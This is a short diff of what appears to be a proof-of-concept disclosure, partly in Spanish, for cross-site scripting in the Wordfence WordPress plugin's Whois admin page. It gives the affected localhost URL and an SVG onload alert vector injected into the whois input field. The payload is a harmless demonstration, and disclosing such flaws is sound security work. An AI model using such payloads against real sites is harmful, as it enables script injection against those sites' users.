@@ -1,5 +1,11 @@
 ###########################################################################################
-Vector: "><svg/onload=alert(/Pentest Criminal Laoin (XSS)/)>
+
+Affected items - Archivos Afectados.
+
+http://localhost/wordpress/wp-admin/admin.php?page=WordfenceWhois
+
+Prueba de Concepto PoC:
+Vector: "><svg/onload=alert(/CL/)>
 
 Input: <input id="wfwhois" type="text" onkeydown="if(event.keyCode == 13){
 WFAD.whois(jQuery('#wfwhois').val()); }"
